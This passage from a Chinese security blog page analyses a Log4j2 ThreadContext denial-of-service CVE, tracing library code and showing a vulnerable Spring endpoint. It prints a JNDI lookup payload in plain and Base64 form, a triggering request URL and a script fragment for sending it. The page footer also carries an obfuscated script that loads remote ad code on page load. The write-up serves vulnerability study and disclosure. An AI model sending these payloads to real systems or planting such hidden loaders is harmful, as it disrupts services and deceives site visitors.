+<pre><code class="prism language-c"><span class="token number">2021</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">15</span> <span class="token number">12</span><span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">860</span> ERROR Main <span class="token punctuation">[</span>main<span class="token punctuation">]</span> <span class="token number">1</span> xxx
+</code></pre> 
+<p>如果代码这样写将会导致类似的拒绝服务</p> 
+<pre><code class="prism language-c">ThreadContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"loginId"</span><span class="token punctuation">,</span><span class="token string">"${jndi:ldap://127.0.0.1}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>在xml中有另一种效果相同的配置方式，但这种写法反而不会触发${}解析</p> 
+<pre><code class="prism language-c"><span class="token operator">&lt;</span>Appenders<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>Console name<span class="token operator">=</span><span class="token string">"STDOUT"</span> target<span class="token operator">=</span><span class="token string">"SYSTEM_OUT"</span><span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span>PatternLayout<span class="token operator">&gt;</span>
+            <span class="token operator">&lt;</span>pattern<span class="token operator">&gt;</span><span class="token operator">%</span>d <span class="token operator">%</span>p <span class="token operator">%</span>c<span class="token punctuation">{<!-- --></span><span class="token number">1.</span><span class="token punctuation">}</span> <span class="token punctuation">[</span><span class="token operator">%</span>t<span class="token punctuation">]</span> <span class="token operator">%</span>X<span class="token punctuation">{<!-- --></span>loginId<span class="token punctuation">}</span> <span class="token operator">%</span>m<span class="token operator">%</span>n<span class="token operator">&lt;</span><span class="token operator">/</span>pattern<span class="token operator">&gt;</span>
+        <span class="token operator">&lt;</span><span class="token operator">/</span>PatternLayout<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>Console<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>Appenders<span class="token operator">&gt;</span>
+</code></pre> 
+<p>在issue中也有人证实了这一点<br> <img src="https://images2.imgbox.com/28/53/zRKyC9lT_o.png" alt="在这里插入图片描述"><br> 关于拒绝服务的分析上文已有，重点看一下ContextMapLookup</p> 
+<pre><code class="prism language-c">@Override
+public String <span class="token function">lookup</span><span class="token punctuation">(</span>final String key<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">return</span> <span class="token function">currentContextData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+@Override
+public String <span class="token function">lookup</span><span class="token punctuation">(</span>final LogEvent event<span class="token punctuation">,</span> final String key<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">return</span> event<span class="token punctuation">.</span><span class="token function">getContextData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>这里的contextData正是一个简单的Map<br> <img src="https://images2.imgbox.com/a7/f3/NrDPOLRz_o.png" alt="在这里插入图片描述"><br> 在resolveVariable方法返回</p> 
+<pre><code class="prism language-c">protected String <span class="token function">resolveVariable</span><span class="token punctuation">(</span>final LogEvent event<span class="token punctuation">,</span> final String variableName<span class="token punctuation">,</span> final StringBuilder buf<span class="token punctuation">,</span>
+                                 final <span class="token keyword">int</span> startPos<span class="token punctuation">,</span> final <span class="token keyword">int</span> endPos<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    final StrLookup resolver <span class="token operator">=</span> <span class="token function">getVariableResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>resolver <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">// 取出了${jndi:ldap://127.0.0.1}</span>
+    <span class="token keyword">return</span> resolver<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> variableName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>取出的payload在下一次的递归中成功被lookup<br> <img src="https://images2.imgbox.com/5c/7d/bfR0PQrN_o.png" alt="在这里插入图片描述"><br> 不难发现lookup时是从event中取Map那么该Map是如何保存到event中的呢</p> 
+<p>定位到创建LogEvent的方法ReusableLogEventFactory.createEvent</p> 
+<pre><code class="prism language-c">@Override
+public LogEvent <span class="token function">createEvent</span><span class="token punctuation">(</span>final String loggerName<span class="token punctuation">,</span> final Marker marker<span class="token punctuation">,</span> final String fqcn<span class="token punctuation">,</span>
+                            final StackTraceElement location<span class="token punctuation">,</span> final Level level<span class="token punctuation">,</span> final Message message<span class="token punctuation">,</span>
+                            final List<span class="token operator">&lt;</span>Property<span class="token operator">&gt;</span> properties<span class="token punctuation">,</span> final Throwable t<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> null <span class="token operator">||</span> result<span class="token punctuation">.</span>reserved<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        final boolean initThreadLocal <span class="token operator">=</span> result <span class="token operator">==</span> null<span class="token punctuation">;</span>
+        <span class="token comment">// 这个类中包含了空的context</span>
+        result <span class="token operator">=</span> new <span class="token function">MutableLogEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment">// 真正设置context属性</span>
+    result<span class="token punctuation">.</span><span class="token function">setContextData</span><span class="token punctuation">(</span>injector<span class="token punctuation">.</span><span class="token function">injectContextData</span><span class="token punctuation">(</span>properties<span class="token punctuation">,</span> <span class="token punctuation">(</span>StringMap<span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">getContextData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result<span class="token punctuation">.</span><span class="token function">setContextStack</span><span class="token punctuation">(</span>ThreadContext<span class="token punctuation">.</span><span class="token function">getDepth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> ThreadContext<span class="token punctuation">.</span>EMPTY_STACK <span class="token operator">:</span> ThreadContext<span class="token punctuation">.</span><span class="token function">cloneStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>跟入ThreadContextDataInjector.injectContextData方法</p> 
+<pre><code class="prism language-c">@Override
+public StringMap <span class="token function">injectContextData</span><span class="token punctuation">(</span>final List<span class="token operator">&lt;</span>Property<span class="token operator">&gt;</span> props<span class="token punctuation">,</span> final StringMap ignore<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>providers<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>props <span class="token operator">==</span> null <span class="token operator">||</span> props<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token comment">// 跟入supplyStringMap</span>
+        <span class="token keyword">return</span> providers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">supplyStringMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>进入ThreadContextDataProvider.supplyStringMap方法</p> 
+<pre><code class="prism language-c">@Override
+public StringMap <span class="token function">supplyStringMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">return</span> ThreadContext<span class="token punctuation">.</span><span class="token function">getThreadContextMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReadOnlyContextData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>在getReadOnlyContextData中获得这个Map<br> <img src="https://images2.imgbox.com/b9/63/9ZkmEfgn_o.png" alt="在这里插入图片描述"><br> 再没有必要做进一步的分析了，这个拒绝服务漏洞原理已经清晰了</p> 
+<h2>
+<a id="CVE_390"></a>CVE利用场景</h2> 
+<p>CVE中提到的利用场景应该更为广泛</p> 
+<p><strong>通常情况下，记录登录用户的身份等信息是常见的操作</strong></p> 
+<p>如果程序员选择了Log4j2这种ctx记录的方式而不是手动拼接字符串，将会导致该漏洞</p> 
+<pre><code class="prism language-c">@<span class="token function">RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>
+@ResponseBody
+public String <span class="token function">test</span><span class="token punctuation">(</span>String userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    try <span class="token punctuation">{<!-- --></span>
+        String id <span class="token operator">=</span> new <span class="token function">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 记录用户登录ID</span>
+        ThreadContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"loginId"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 记录该用户已登录</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"user login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 其他业务逻辑</span>
+        <span class="token comment">// ...</span>
+    <span class="token punctuation">}</span> <span class="token function">catch</span> <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>正常情况下：http://localhost:8080/test?userId=MQ==</p> 
+<p>将会记录</p> 
+<pre><code class="prism language-c"><span class="token number">2021</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">15</span> <span class="token number">12</span><span class="token operator">:</span><span class="token number">51</span><span class="token operator">:</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">845</span> <span class="token punctuation">[</span>http<span class="token operator">-</span>nio<span class="token operator">-</span><span class="token number">8080</span><span class="token operator">-</span>exec<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token number">1</span> user login
+</code></pre> 
+<p>如果打Payload则报错并成功阻塞</p> 
+<pre><code class="prism language-c">http<span class="token operator">:</span><span class="token comment">//localhost:8080/test?userId=JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjF9</span>
+</code></pre> 
+<p>改写下Python脚本即可成功拒绝服务</p> 
+<pre><code class="prism language-c">url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/test?userId="</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+</code></pre> 
+<h2>
+<a id="_436"></a>代码</h2> 
+<p>SpringBoot搭建的利用环境代码：https://github.com/EmYiQing/Log4j2DoS</p> 
+<h2>
+<a id="_440"></a>更新</h2> 
+<p>Apache已经将我的名字加入了CVE的credit中<br> <img src="https://images2.imgbox.com/a5/af/PRNfUCDh_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/50/db/g0gAVWaY_o.png" alt="在这里插入图片描述"></p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
